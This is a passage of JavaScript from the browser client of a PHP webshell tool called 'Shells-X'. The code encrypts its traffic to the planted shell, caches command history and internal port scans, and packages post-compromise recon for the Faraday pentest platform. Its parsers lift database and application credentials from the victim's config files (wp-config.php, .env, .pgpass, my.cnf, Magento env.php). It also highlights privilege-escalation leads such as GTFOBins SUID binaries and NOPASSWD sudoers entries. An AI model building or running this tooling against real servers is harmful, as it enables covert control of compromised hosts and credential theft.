  if (typeof sha256 !== 'function' || typeof aesjs === 'undefined') {
    throw new Error('crypto.js requires sha256.js and aesjs.js before crypto.js');
  }

  function hexToBytes(hex) {
    const bytes = new Uint8Array(hex.length / 2);
    for (let i = 0; i < hex.length; i += 2) bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
    return bytes;
  }

  function bytesToB64(bytes) {
    let binary = '';
    const chunk = 0x8000;
    for (let i = 0; i < bytes.length; i += chunk) {
      binary += String.fromCharCode.apply(null, bytes.subarray(i, i + chunk));
    }
    return btoa(binary);
  }

  function b64ToBytes(b64) {
    return Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  }

  function arrayBufferToB64(buf) {
    return bytesToB64(new Uint8Array(buf));
  }

  // IVs must come from a CSPRNG. getRandomValues is available in all browsers we
  // target (incl. HTTP LAN IPs); it is not gated on secure context (unlike
  // crypto.subtle). Missing only on obsolete engines (IE9-), locked-down
  // WebViews, or rare hardening that disables Web Crypto entirely.
  function randomBytes(n) {
    if (!window.crypto || typeof window.crypto.getRandomValues !== 'function') {
      throw new Error(
        'crypto.getRandomValues() is not available — use a current browser; ' +
        'encryption cannot run safely without it.'
      );
    }
    const out = new Uint8Array(n);
    window.crypto.getRandomValues(out);
    return out;
  }

  function digestSha256Hex(str) {
    return sha256(str);
  }

  // Wire format: base64( iv[16] || aes-256-cbc-pkcs7(plaintext) ) — same as PHP side.
  function encryptStr(plaintext, keyHex) {
    const key = Array.from(hexToBytes(keyHex));
    const iv = Array.from(randomBytes(16));
    const padded = aesjs.padding.pkcs7.pad(Array.from(new TextEncoder().encode(plaintext)));
    const enc = new aesjs.ModeOfOperation.cbc(key, iv).encrypt(padded);
    const out = new Uint8Array(16 + enc.length);
    out.set(iv);
    out.set(enc, 16);
    return bytesToB64(out);
  }

  function unwrapEncBody(text) {
    let t = text.trim();
    const m = t.match(/^<!--\s*([\s\S]*?)\s*-->$/);
    if (m) t = m[1].trim();
    return t;
  }

  function decryptStr(b64, keyHex) {
    const key = Array.from(hexToBytes(keyHex));
    const raw = b64ToBytes(b64);
    const iv = Array.from(raw.slice(0, 16));
    const ct = Array.from(raw.slice(16));
    const dec = aesjs.padding.pkcs7.strip(new aesjs.ModeOfOperation.cbc(key, iv).decrypt(ct));
    return new TextDecoder().decode(new Uint8Array(dec));
  }

  async function fdToQueryString(fd) {
    const params = new URLSearchParams();
    for (const [k, v] of fd.entries()) {
      if (v instanceof File) {
        params.append('file_name', v.name);
        params.append('file_b64', arrayBufferToB64(await v.arrayBuffer()));
      } else {
        params.append(k, v);
      }
    }
    return params.toString();
  }

  function _showPassphraseOverlay(digestFn) {
    const ov = document.createElement('div');
    ov.className = 'enc-overlay';
    ov.innerHTML =
      '<div class="enc-overlay-box">'
      + '<div class="enc-overlay-title">Session key required</div>'
      + '<div class="enc-overlay-hint">Enter the login password to initialise the encryption key for this tab.</div>'
      + '<input id="__sx_enc_pw" type="password" placeholder="Password" autocomplete="current-password" class="form-control enc-overlay-input">'
      + '<button id="__sx_enc_ok" class="btn btn-primary enc-overlay-btn">Unlock</button>'
      + '<div id="__sx_enc_err" class="enc-overlay-err"></div>'
      + '</div>';
    document.body.appendChild(ov);
    const inp = ov.querySelector('#__sx_enc_pw');
    const btn = ov.querySelector('#__sx_enc_ok');
    const err = ov.querySelector('#__sx_enc_err');
    inp.focus();
    function submit() {
      const pw = inp.value;
      if (!pw) { err.textContent = 'Password required'; return; }
      sessionStorage.setItem('__enc_key', digestFn(pw));
      location.reload();
    }
    btn.addEventListener('click', submit);
    inp.addEventListener('keydown', function(e) { if (e.key === 'Enter') { e.preventDefault(); submit(); } });
  }

  let encKeyHex = sessionStorage.getItem('__enc_key');
  if (!encKeyHex) {
    _showPassphraseOverlay(digestSha256Hex);
    return;
  }

  window.fetchJSON = async function(fd) {
    const params = await fdToQueryString(fd);
    const encPayload = encryptStr(params, encKeyHex);
    const encFd = new FormData();
    encFd.append('__enc', encPayload);

    const response = await fetch(BASE_URL, { method: 'POST', body: encFd });
    const encText = unwrapEncBody(await response.text());
    let plaintext = null;
    try { plaintext = decryptStr(encText, encKeyHex); }
    catch(_) { /* fall through */ }

    if (plaintext !== null) {
      try { return JSON.parse(plaintext); }
      catch(_) {
        return { output: plaintext, error: null, _raw: true };
      }
    }

    throw new Error('Response was neither encrypted nor JSON:\n' +
      encText.substring(0, 500));
  };

  window.ShellsXDigestSha256 = digestSha256Hex;
})();
} catch (e) {
  console.error('crypto module init failed:', e);
}


// ==================== INDEXEDDB STORAGE ====================
const DB_NAME = 'shelldb', DB_VER = 3;
let _db = null;
let _dbOpenPromise = null;

function dbOpen() {
  if (_db) return Promise.resolve(_db);
  if (_dbOpenPromise) return _dbOpenPromise;
  _dbOpenPromise = new Promise((res, rej) => {
    const req = indexedDB.open(DB_NAME, DB_VER);
    req.onupgradeneeded = e => {
      const db = e.target.result;
      if (db.objectStoreNames.length > 0) {
        console.warn(
          'Shells-X: IndexedDB schema upgraded (v' + DB_VER + ') — ' +
          'local command history and scan cache were cleared for this origin.'
        );
      }
      // Clean slate — drop any prior stores and recreate the current schema
      Array.from(db.objectStoreNames).forEach(name => db.deleteObjectStore(name));
      db.createObjectStore('history', { keyPath: 'ts' });
      db.createObjectStore('scans', { keyPath: 'id' });
      // Composite key [scan_id, seq] — server-assigned seq is monotonic per scan,
      // so re-fetching the same byte range from the events file is idempotent.
      const results = db.createObjectStore('scan_results', { keyPath: ['scan_id', 'seq'] });
      results.createIndex('by_scan', 'scan_id', { unique: false });
    };
    req.onblocked = () => {
      // Another open tab is holding the DB at an older version. Surface it so
      // the user knows why nothing is rendering instead of staring at a spinner.
      console.warn('IndexedDB upgrade blocked — close other shell tabs and refresh');
      rej(new Error('DB upgrade blocked — close other shell tabs and refresh'));
    };
    req.onsuccess = e => {
      _db = e.target.result;
      _db.onversionchange = () => { _db.close(); _db = null; _dbOpenPromise = null; };
      res(_db);
    };
    req.onerror = e => {
      _dbOpenPromise = null;
      rej(e.target.error);
    };
  });
  return _dbOpenPromise;
}

function dbGetAll(store) {
  return dbOpen().then(db => new Promise((res, rej) => {
    const req = db.transaction(store, 'readonly').objectStore(store).getAll();
    req.onsuccess = e => {
      const rows = e.target.result;
      // history is keyed by ts (ISO string) — sort newest first
      if (store === 'history') rows.sort((a, b) => (b.ts || '').localeCompare(a.ts || ''));
      res(rows);
    };
    req.onerror   = e => rej(e.target.error);
  }));
}

function dbPut(store, obj) {
  return dbOpen().then(db => new Promise((res, rej) => {
    const req = db.transaction(store, 'readwrite').objectStore(store).put(obj);
    req.onsuccess = e => res(e.target.result);
    req.onerror   = e => rej(e.target.error);
  }));
}

function dbPutMany(store, objs) {
  if (!objs || !objs.length) return Promise.resolve();
  return dbOpen().then(db => new Promise((res, rej) => {
    const tx = db.transaction(store, 'readwrite');
    const os = tx.objectStore(store);
    objs.forEach(o => os.put(o));
    tx.oncomplete = () => res();
    tx.onerror    = e => rej(e.target.error);
  }));
}

function dbDelete(store, key) {
  return dbOpen().then(db => new Promise((res, rej) => {
    const req = db.transaction(store, 'readwrite').objectStore(store).delete(key);
    req.onsuccess = () => res();
    req.onerror   = e => rej(e.target.error);
  }));
}

function dbClear(store) {
  return dbOpen().then(db => new Promise((res, rej) => {
    const req = db.transaction(store, 'readwrite').objectStore(store).clear();
    req.onsuccess = () => res();
    req.onerror   = e => rej(e.target.error);
  }));
}

function dbGetByIndex(store, indexName, value) {
  return dbOpen().then(db => new Promise((res, rej) => {
    const req = db.transaction(store, 'readonly').objectStore(store).index(indexName).getAll(value);
    req.onsuccess = e => res(e.target.result);
    req.onerror   = e => rej(e.target.error);
  }));
}

function dbDeleteByIndex(store, indexName, value) {
  return dbOpen().then(db => new Promise((res, rej) => {
    const tx = db.transaction(store, 'readwrite');
    const os = tx.objectStore(store);
    const idx = os.index(indexName);
    const req = idx.openCursor(IDBKeyRange.only(value));
    req.onsuccess = e => {
      const cur = e.target.result;
      if (cur) { os.delete(cur.primaryKey); cur.continue(); }
    };
    tx.oncomplete = () => res();
    tx.onerror    = e => rej(e.target.error);
  }));
}

// ==================== DB EXPORT / IMPORT ====================
function exportDB() {
  Promise.all([dbGetAll('history'), dbGetAll('scans'), dbGetAll('scan_results')]).then(([history, scans, results]) => {
    const data = {
      version: 3,
      exported: new Date().toISOString(),
      history: history,
      scans: scans,
      scan_results: results,
    };
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'shelldb_' + Date.now() + '.json';
    a.click();
  });
}

function importDB(input) {
  const file = input.files[0];
  if (!file) return;
  input.value = '';
  const reader = new FileReader();
  reader.onload = function(e) {
    let data;
    try { data = JSON.parse(e.target.result); } catch(_) { alert('Invalid JSON file.'); return; }
    if (!data || typeof data !== 'object') { alert('Invalid DB file format.'); return; }
    const history = Array.isArray(data.history) ? data.history : [];
    const scans = Array.isArray(data.scans) ? data.scans : [];
    const results = Array.isArray(data.scan_results) ? data.scan_results : [];
    if (history.length + scans.length + results.length === 0) { alert('No data found in file.'); return; }
    const mode = confirm(
      'Import ' + history.length + ' history, ' + scans.length + ' scans, ' + results.length + ' scan results.\n\n' +
      'OK = Merge with existing data\nCancel = Replace all existing data'
    );
    const work = mode
      ? Promise.resolve()
      : Promise.all([dbClear('history'), dbClear('scans'), dbClear('scan_results')]);
    work.then(() => Promise.all([
      dbPutMany('history', history.filter(h => h && h.ts)),
      dbPutMany('scans', scans.filter(s => s && s.id)),
      // strip legacy rowid from v2 exports; composite [scan_id,seq] is the key now
      dbPutMany('scan_results', results.filter(r => r && r.scan_id && typeof r.seq === 'number').map(r => { const { rowid, ...rest } = r; return rest; })),
    ])).then(() => {
      alert('Import complete (' + history.length + ' history, ' + scans.length + ' scans, ' + results.length + ' results).');
      if (typeof renderHistory === 'function') renderHistory();
      if (typeof renderScans === 'function') renderScans();
    }).catch(err => alert('Import error: ' + err));
  };
  reader.readAsText(file);
}


// ==================== FARADAY EXPORT ====================
// Build a `faraday_json`-compatible JSON file from the data we've collected in
// IndexedDB (scans, scan_results) plus the last loaded diagnostics blob, and
// drop it in the operator's Downloads folder. They upload it via
// `faraday-cli tool report <file>` or by drag-dropping into the Faraday web
// UI. Export-only by design: no fetch, no token storage, no CORS surface.
// See claudedocs/design_faraday_export.md.

const FARADAY_LS_WORKSPACE = 'faraday.workspace';
const FARADAY_LS_USER      = 'faraday.user';

// Cached by diagnostics.js after each loadDiag() so the export can grab the
// freshest snapshot without re-running the recon scan.
window._lastDiagBlob = window._lastDiagBlob || null;

function _faradayCfg() {
  return {
    workspace: localStorage.getItem(FARADAY_LS_WORKSPACE) || '',
    user: localStorage.getItem(FARADAY_LS_USER) || 'operator',
  };
}

function faradaySaveSettings() {
  const ws = (document.getElementById('faraday-workspace').value || '').trim();
  const usr = (document.getElementById('faraday-user').value || '').trim() || 'operator';
  localStorage.setItem(FARADAY_LS_WORKSPACE, ws);
  localStorage.setItem(FARADAY_LS_USER, usr);
  const status = document.getElementById('faraday-save-status');
  if (status) {
    status.textContent = '✓ saved';
    status.style.color = 'var(--green)';
    setTimeout(() => { status.textContent = ''; }, 1500);
  }
}

function faradayLoadSettings() {
  // Populate the settings card inputs from localStorage on Diagnostics tab open.
  const c = _faradayCfg();
  const ws  = document.getElementById('faraday-workspace');
  const usr = document.getElementById('faraday-user');
  if (ws  && !ws.value)  ws.value  = c.workspace;
  if (usr && !usr.value) usr.value = c.user;
}

function faradayToggleSettings() {
  const panel = document.getElementById('faraday-settings-panel');
  if (!panel) return;
  const opening = panel.hasAttribute('hidden');
  if (opening) {
    panel.removeAttribute('hidden');
    faradayLoadSettings();
  } else {
    panel.setAttribute('hidden', '');
  }
  const toggle = document.querySelector('.split-btn-toggle');
  if (toggle) toggle.setAttribute('aria-expanded', opening ? 'true' : 'false');
}

function _faradayClosePanel() {
  const panel = document.getElementById('faraday-settings-panel');
  if (!panel || panel.hasAttribute('hidden')) return;
  panel.setAttribute('hidden', '');
  const toggle = document.querySelector('.split-btn-toggle');
  if (toggle) toggle.setAttribute('aria-expanded', 'false');
}

// Bind click-outside-to-close + Esc once, lazily. Idempotent.
function _faradayBindOutsideClose() {
  if (window._faradayOutsideBound) return;
  window._faradayOutsideBound = true;
  document.addEventListener('click', e => {
    const panel = document.getElementById('faraday-settings-panel');
    if (!panel || panel.hasAttribute('hidden')) return;
    if (panel.contains(e.target)) return;
    if (e.target.closest('.split-btn-toggle')) return; // toggle handles itself
    _faradayClosePanel();
  });
  document.addEventListener('keydown', e => {
    if (e.key === 'Escape') _faradayClosePanel();
  });
}

function _faradayRequireWorkspace() {
  const cfg = _faradayCfg();
  if (!cfg.workspace) {
    alert('Set a Faraday workspace name first (sidebar → Faraday export ▾).');
    // Open the sidebar settings panel and focus the workspace input
    const panel = document.getElementById('faraday-settings-panel');
    if (panel && panel.hasAttribute('hidden')) faradayToggleSettings();
    const ws = document.getElementById('faraday-workspace');
    if (ws) ws.focus();
    return null;
  }
  return cfg;
}

// =================== Payload builders ===================
// This export is recon data, not a pentest finding set. We never push
// Vulnerability entities — everything we know goes into descriptions,
// services, credentials, or hostnames. Faraday's Vulnerability view stays
// clean for actual testing work the operator does later.

function _faradayServiceFromScanResult(r) {
  const descParts = [];
  if (r.banner) descParts.push((r.banner || '').substring(0, 1024));
  if (r.tls) {
    const t = r.tls;
    descParts.push(
      '[TLS]' +
      (t.self_signed ? ' self-signed' : '') +
      '\nCN=' + (t.subject_cn || '') +
      '\nIssuer=' + (t.issuer_cn || '') + (t.issuer_org ? ' / ' + t.issuer_org : '') +
      '\nValid: ' + (t.valid_from || '') + ' → ' + (t.valid_to || '') +
      (t.sans && t.sans.length ? '\nSANs: ' + t.sans.join(', ') : '')
    );
  }
  // Only 'open' is ever persisted by scanner.php (closed/filtered counts
  // live in the per-scan summary, not the events file), so we hardcode
  // status here rather than mapping r.state.
  return {
    name: r.service || '',
    port: r.port,
    protocol: r.proto || 'tcp',
    status: 'open',
    version: r.version || '',
    description: descParts.join('\n\n'),
    vulnerabilities: [],
  };
}

// =================== Credential parsers ===================
// Each parser returns an array of {name, username, password, endpoint}
// records. Values are taken verbatim — no decoding of connection-string
// syntax, no unescaping. We rely on _faradayDedupCredentials to collapse
// duplicates emitted across parsers (e.g. wp-config.php parsed by both the
// generic credential_files block AND the frameworks block).

function _faradayParseEnvCredentials(path, content) {
  const creds = [];
  if (!content) return creds;
  for (const raw of content.split(/\r?\n/)) {
    const line = raw.trim();
    if (!line || line.startsWith('#')) continue;
    const stripped = line.replace(/^export\s+/, '');
    const eq = stripped.indexOf('=');
    if (eq <= 0) continue;
    const key = stripped.slice(0, eq).trim();
    if (!/^[A-Za-z_][A-Za-z0-9_]*$/.test(key)) continue;
    let val = stripped.slice(eq + 1).trim();
    if (val.length >= 2 &&
        ((val.startsWith('"') && val.endsWith('"')) ||
         (val.startsWith("'") && val.endsWith("'")))) {
      val = val.slice(1, -1);
    }
    creds.push({ name: key, username: key, password: val, endpoint: path });
  }
  return creds;
}

// INI-style: my.cnf / debian.cnf. Looks for user / password / host / port
// under any section. We don't track sections — duplicate keys across
// [client] / [mysqld] just produce multiple identical creds which dedup'll fold.
function _faradayParseMyCnf(path, content) {
  const creds = [];
  if (!content) return creds;
  const fields = {};
  for (const raw of content.split(/\r?\n/)) {
    const line = raw.trim();
    if (!line || line.startsWith('#') || line.startsWith(';') || line.startsWith('[')) continue;
    const eq = line.indexOf('=');
    if (eq <= 0) continue;
    const key = line.slice(0, eq).trim().toLowerCase();
    let val = line.slice(eq + 1).trim();
    if (val.length >= 2 &&
        ((val.startsWith('"') && val.endsWith('"')) ||
         (val.startsWith("'") && val.endsWith("'")))) {
      val = val.slice(1, -1);
    }
    if (['user', 'username', 'password', 'host', 'port', 'socket', 'database'].indexOf(key) !== -1) {
      fields[key] = val;
    }
  }
  if (fields.user || fields.username || fields.password) {
    creds.push({
      name: 'mysql @ ' + (fields.host || 'localhost') + (fields.port ? ':' + fields.port : ''),
      username: fields.user || fields.username || '',
      password: fields.password || '',
      endpoint: path,
    });
  }
  return creds;
}

// .pgpass: hostname:port:database:username:password (colon-separated, one per line).
function _faradayParsePgpass(path, content) {
  const creds = [];
  if (!content) return creds;
  for (const raw of content.split(/\r?\n/)) {
    const line = raw.trim();
    if (!line || line.startsWith('#')) continue;
    const parts = line.split(':');
    if (parts.length < 5) continue;
    const [host, port, db, user, pass] = parts;
    creds.push({
      name: 'postgres @ ' + (host === '*' ? 'any' : host) + (port === '*' ? '' : ':' + port) + (db === '*' ? '' : '/' + db),
      username: user || '',
      password: pass || '',
      endpoint: path,
    });
  }
  return creds;
}

// wp-config.php: DB_USER / DB_PASSWORD / DB_HOST / DB_NAME defines.
function _faradayParseWpConfig(path, content) {
  if (!content) return [];
  const grab = re => { const m = content.match(re); return m ? m[1] : ''; };
  const user = grab(/define\s*\(\s*['"]DB_USER['"]\s*,\s*['"]([^'"]*)/);
  const pass = grab(/define\s*\(\s*['"]DB_PASSWORD['"]\s*,\s*['"]([^'"]*)/);
  const host = grab(/define\s*\(\s*['"]DB_HOST['"]\s*,\s*['"]([^'"]*)/);
  const db   = grab(/define\s*\(\s*['"]DB_NAME['"]\s*,\s*['"]([^'"]*)/);
  if (!user && !pass) return [];
  return [{
    name: 'WordPress DB @ ' + (host || '?') + (db ? '/' + db : ''),
    username: user, password: pass, endpoint: path,
  }];
}

// Rails / Symfony YAML database config — extremely loose grep, not a real YAML parser.
function _faradayParseDbYaml(path, content) {
  if (!content) return [];
  const grab = re => { const m = content.match(re); return m ? m[1].trim().replace(/^['"]|['"]$/g, '') : ''; };
  const user = grab(/^\s*username\s*:\s*(.+)$/m);
  const pass = grab(/^\s*password\s*:\s*(.+)$/m);
  const host = grab(/^\s*host\s*:\s*(.+)$/m);
  const db   = grab(/^\s*database\s*:\s*(.+)$/m);
  if (!user && !pass) return [];
  return [{
    name: 'app DB @ ' + (host || 'localhost') + (db ? '/' + db : ''),
    username: user, password: pass, endpoint: path,
  }];
}

// Magento 2 env.php — 'username' => 'value', 'password' => 'value'
function _faradayParseMagentoEnv(path, content) {
  if (!content) return [];
  const grab = re => { const m = content.match(re); return m ? m[1] : ''; };
  const user = grab(/'username'\s*=>\s*'([^']*)/);
  const pass = grab(/'password'\s*=>\s*'([^']*)/);
  const host = grab(/'host'\s*=>\s*'([^']*)/);
  const db   = grab(/'dbname'\s*=>\s*'([^']*)/);
  if (!user && !pass) return [];
  return [{
    name: 'Magento DB @ ' + (host || 'localhost') + (db ? '/' + db : ''),
    username: user, password: pass, endpoint: path,
  }];
}

// Dispatch a credential_files entry to the right parser based on its filename.
function _faradayParseCredentialFile(path, content) {
  const lower = path.toLowerCase();
  if (lower.endsWith('.pgpass'))                            return _faradayParsePgpass(path, content);
  if (/\.my\.cnf$|\/debian\.cnf$/.test(lower))              return _faradayParseMyCnf(path, content);
  if (/wp-config\.php$/.test(lower))                        return _faradayParseWpConfig(path, content);
  if (/database\.ya?ml$|parameters\.ya?ml$/.test(lower))    return _faradayParseDbYaml(path, content);
  if (/app\/etc\/env\.php$|local\.xml$/.test(lower))        return _faradayParseMagentoEnv(path, content);
  // Fallback: try the env parser — picks up any KEY=value shape if the file
  // happens to be env-shaped (no harm if it returns nothing).
  return _faradayParseEnvCredentials(path, content);
}

// Pull pre-parsed db_* details out of diag.frameworks into Credentials. The
// PHP backend already grepped these from each framework's config — no need
// to re-parse the file content here. Dedup will collapse overlap with
// _faradayParseCredentialFile.
function _faradayFrameworkCredentials(frameworks) {
  const creds = [];
  (frameworks || []).forEach(fw => {
    const d = fw.details || {};
    const endpoint = fw.config_path || '';
    if (d.db_user || d.db_pass) {
      creds.push({
        name: (fw.name || 'framework') + ' DB @ ' + (d.db_host || 'localhost') + (d.db_name ? '/' + d.db_name : ''),
        username: d.db_user || '',
        password: d.db_pass || '',
        endpoint: endpoint,
      });
    }
    if (d.app_key) {
      creds.push({
        name: (fw.name || 'framework') + ' APP_KEY',
        username: 'APP_KEY',
        password: d.app_key,
        endpoint: endpoint,
      });
    }
    if (d.database_url) {
      // Symfony DATABASE_URL is itself a credential string — emit verbatim.
      creds.push({
        name: (fw.name || 'framework') + ' DATABASE_URL',
        username: 'DATABASE_URL',
        password: d.database_url,
        endpoint: endpoint,
      });
    }
  });
  return creds;
}

// Collapse duplicate credentials by (username, password, endpoint). The same
// .env imported via two scans, or wp-config.php found by both the generic
// credential_files block and the frameworks block, would otherwise stack
// identically — Faraday dedupes server-side but we keep the file lean.
function _faradayDedupCredentials(creds) {
  const seen = new Set();
  const out = [];
  for (const c of creds) {
    const k = (c.username || '') + '\x00' + (c.password || '') + '\x00' + (c.endpoint || '');
    if (seen.has(k)) continue;
    seen.add(k);
    out.push(c);
  }
  return out;
}

// Build host bundles from scan_results rows, merging per-IP across scans.
// We only export 'open' ports — scanner.php intentionally omits filtered /
// closed events from the JSONL persist (faraday.js followed that contract).
function _faradayHostsFromScanResults(rows) {
  const hosts = {};
  rows.filter(r => r.state === 'open').forEach(r => {
    if (!hosts[r.host]) hosts[r.host] = { ip: r.host, hostnames: [], mac: '', os: '', services: [], vulnerabilities: [], credentials: [] };
    const key = r.port + '/' + (r.proto || 'tcp');
    const existing = hosts[r.host].services.find(s => (s.port + '/' + s.protocol) === key);
    if (!existing) {
      hosts[r.host].services.push(_faradayServiceFromScanResult(r));
    } else {
      // Same port/proto seen again with potentially fresh banner/version —
      // merge rather than drop. A reverse proxy that rotates between
      // Apache/nginx, or a banner that surfaced TLS info only on a second
      // pass, would otherwise lose data.
      const fresh = _faradayServiceFromScanResult(r);
      if (fresh.version && !existing.version) existing.version = fresh.version;
      if (fresh.name && !existing.name) existing.name = fresh.name;
      if (fresh.description && existing.description.indexOf(fresh.description) === -1) {
        existing.description = (existing.description ? existing.description + '\n\n---\n' : '') + fresh.description;
      }
    }
    // TLS SANs become additional hostnames on the host — these are
    // searchable in Faraday's Host view, where they belong, instead of
    // being buried inside the service description string.
    if (r.tls && r.tls.sans && r.tls.sans.length) {
      r.tls.sans.forEach(san => {
        const clean = String(san).replace(/^\*\./, '');   // wildcard SANs aren't usable as hostnames
        if (clean && hosts[r.host].hostnames.indexOf(clean) === -1) {
          hosts[r.host].hostnames.push(clean);
        }
      });
    }
    if (r.tls && r.tls.subject_cn) {
      const cn = String(r.tls.subject_cn).replace(/^\*\./, '');
      if (cn && hosts[r.host].hostnames.indexOf(cn) === -1) hosts[r.host].hostnames.push(cn);
    }
  });
  return hosts;
}

// Merge ARP-derived MACs into hosts the payload already contains. Runs on
// every export so per-scan exports still get MAC addresses for the IPs in
// their scan. Doesn't add new hosts — _faradayApplyDiag does that.
function _faradayMergeArpMacs(hosts, diag) {
  if (!diag || !diag.arp_hosts) return 0;
  let merged = 0;
  diag.arp_hosts.forEach(a => {
    if (!a.ip || !a.mac || a.ip === '0.0.0.0') return;
    if (hosts[a.ip] && !hosts[a.ip].mac) { hosts[a.ip].mac = a.mac; merged++; }
  });
  return merged;
}

// Build a multi-line `host.description` that captures the full diag posture
// for the target host (the box where the webshell runs). Faraday renders
// description verbatim in the Host detail view — multi-line plain text fits.
function _faradayHostDescription(diag) {
  const lines = [];
  const push = (label, val) => { if (val !== undefined && val !== null && val !== '') lines.push(label.padEnd(22) + val); };

  lines.push('— SYSTEM —');
  push('Webshell path:',  diag.webshell_path);
  push('PHP:',            diag.php_version);
  push('Server software:', diag.server);
  push('OS:',             diag.os);
  push('CWD:',            diag.cwd);
  push('Disk:',           diag.disk_free ? ('free ' + Math.round(diag.disk_free / 1e6) + 'MB / total ' + Math.round(diag.disk_total / 1e6) + 'MB') : null);
  lines.push('');

  lines.push('— IDENTITY —');
  push('User:',           (diag.user_name || '?') + (diag.uid !== undefined ? ' (uid=' + diag.uid + ')' : ''));
  push('Group:',          (diag.group_name || '?') + (diag.gid !== undefined ? ' (gid=' + diag.gid + ')' : ''));
  push('Supplementary:',  diag.groups || null);
  lines.push('');

  lines.push('— PHP POSTURE —');
  push('disable_functions:', diag.disable_functions);
  push('open_basedir:',      diag.open_basedir);
  push('max_execution_time:', diag.max_execution_time);
  push('allow_url_fopen:',   diag.allow_url_fopen);
  push('sendmail_path:',     diag.sendmail_path);
  if (diag.container && diag.container.detected) {
    push('Container:',       (diag.container.type || 'detected') + (diag.container.hints && diag.container.hints.length ? ' (' + diag.container.hints.join('; ') + ')' : ''));
  }
  lines.push('');

  if ((diag.interpreters && diag.interpreters.length) || (diag.tools && diag.tools.length)) {
    lines.push('— CAPABILITIES —');
    if (diag.interpreters && diag.interpreters.length) push('Interpreters:', diag.interpreters.map(p => p.split('/').pop()).slice(0, 12).join(', '));
    if (diag.tools && diag.tools.length)               push('Tools:',        diag.tools.map(p => p.split('/').pop()).slice(0, 16).join(', '));
    lines.push('');
  }

  if (diag.panels && diag.panels.length) {
    lines.push('— DETECTED PANELS —');
    diag.panels.forEach(p => lines.push('  • ' + p));
    lines.push('');
  }

  if (diag.frameworks && diag.frameworks.length) {
    lines.push('— FRAMEWORKS —');
    diag.frameworks.forEach(fw => {
      lines.push('  • ' + (fw.name || '?') + (fw.version ? ' ' + fw.version : '') + (fw.config_path ? '  [' + fw.config_path + ']' : ''));
      const d = fw.details || {};
      // Surface non-credential details inline; db_* are extracted to Credentials.
      if (d.debug)        lines.push('      debug=' + d.debug);
      if (d.app_env)      lines.push('      env=' + d.app_env);
      if (d.admin_path)   lines.push('      admin=' + d.admin_path);
      if (d.table_prefix) lines.push('      table_prefix=' + d.table_prefix);
      if (d.plugins !== undefined) lines.push('      plugins=' + d.plugins + (d.themes !== undefined ? ' themes=' + d.themes : ''));
    });
    lines.push('');
  }

  if (diag.kernel_info) {
    lines.push('— KERNEL —');
    push('Release:', diag.kernel_info.release || diag.kernel_info.version);
    push('Arch:',    diag.kernel_info.arch);
    if (diag.kernel_info.aslr !== undefined && diag.kernel_info.aslr !== null && diag.kernel_info.aslr !== false) {
      const aslrMap = { '0': 'disabled', '1': 'conservative', '2': 'full' };
      push('ASLR:', aslrMap[String(diag.kernel_info.aslr)] || diag.kernel_info.aslr);
    }
    if (diag.security_modules) {
      const sm = [];
      if (diag.security_modules.selinux && diag.security_modules.selinux.present) {
        sm.push('SELinux=' + (diag.security_modules.selinux.enforcing === 1 ? 'enforcing' : (diag.security_modules.selinux.enforcing === 0 ? 'permissive' : 'present')));
      }
      if (diag.security_modules.apparmor && diag.security_modules.apparmor.present) {
        sm.push('AppArmor=' + (diag.security_modules.apparmor.profiles_count || 0) + ' profiles');
      }
      if (diag.security_modules.seccomp !== null && diag.security_modules.seccomp !== undefined) {
        const seccompMap = { 0: 'disabled', 1: 'strict', 2: 'filter' };
        sm.push('Seccomp=' + (seccompMap[diag.security_modules.seccomp] || diag.security_modules.seccomp));
      }
      if (sm.length) push('Security mods:', sm.join(', '));
    }
    lines.push('');
  }

  // Capabilities — highlight the dangerous ones the operator should look at first.
  if (diag.capabilities && diag.capabilities.CapEff) {
    const dangerous = new Set(['CAP_SETUID','CAP_SYS_ADMIN','CAP_DAC_OVERRIDE','CAP_DAC_READ_SEARCH','CAP_SYS_PTRACE','CAP_NET_RAW','CAP_SYS_MODULE','CAP_CHOWN','CAP_FOWNER','CAP_SETGID']);
    const eff = (diag.capabilities.CapEff.caps || []);
    const danger = eff.filter(c => dangerous.has(c));
    if (eff.length) {
      lines.push('— LINUX CAPABILITIES (effective) —');
      if (danger.length) lines.push('  ⚠ dangerous: ' + danger.join(', '));
      const safe = eff.filter(c => !dangerous.has(c));
      if (safe.length) lines.push('  other: ' + safe.join(', '));
      lines.push('');
    }
  }

  const exposureLines = [];
  if (diag.readable_files && diag.readable_files.length) {
    exposureLines.push('Readable sensitive files (' + diag.readable_files.length + '):');
    diag.readable_files.slice(0, 12).forEach(f => exposureLines.push('  • ' + f));
    if (diag.readable_files.length > 12) exposureLines.push('  (+' + (diag.readable_files.length - 12) + ' more)');
  }
  if (diag.suid_binaries && diag.suid_binaries.length) {
    // Highlight GTFOBins-known binaries — those are immediate privesc leads.
    const gtfo = diag.suid_binaries.filter(b => b && b.gtfobins);
    const other = diag.suid_binaries.filter(b => b && !b.gtfobins);
    exposureLines.push('SUID binaries (' + diag.suid_binaries.length + ', ' + gtfo.length + ' GTFOBins):');
    gtfo.slice(0, 16).forEach(b => exposureLines.push('  ⚠ ' + b.path + '  [GTFOBins]'));
    other.slice(0, Math.max(0, 16 - gtfo.length)).forEach(b => exposureLines.push('  • ' + (b.path || JSON.stringify(b))));
  }
  if (diag.group_memberships && Object.keys(diag.group_memberships).length) {
    exposureLines.push('Privileged group memberships:');
    Object.entries(diag.group_memberships).forEach(([g, members]) => {
      (members || []).forEach(m => { if (m) exposureLines.push('  • ' + m + ' ∈ ' + g); });
    });
  }
  if (exposureLines.length) {
    lines.push('— EXPOSURES —');
    lines.push.apply(lines, exposureLines);
    lines.push('');
  }

  // Privilege-escalation surface — sudoers, cron writable scripts, ld.so.preload,
  // writable systemd timers, NFS no_root_squash, dangerous docker socket.
  const privescLines = [];
  if (diag.sudo_config && diag.sudo_config.readable && diag.sudo_config.files) {
    const paths = Object.keys(diag.sudo_config.files);
    if (paths.length) {
      privescLines.push('Sudoers readable: ' + paths.join(', '));
      // Just show NOPASSWD lines from each file — full sudoers content can be huge.
      paths.forEach(p => {
        const content = diag.sudo_config.files[p] || '';
        content.split(/\r?\n/).forEach(l => {
          if (/NOPASSWD/i.test(l) && !l.trim().startsWith('#')) privescLines.push('  • ' + p + ': ' + l.trim());
        });
      });
    }
  }
  if (diag.cron_jobs && diag.cron_jobs.length) {
    const writableCronSources = diag.cron_jobs.filter(j => j.source_writable);
    const writableCronScripts = [];
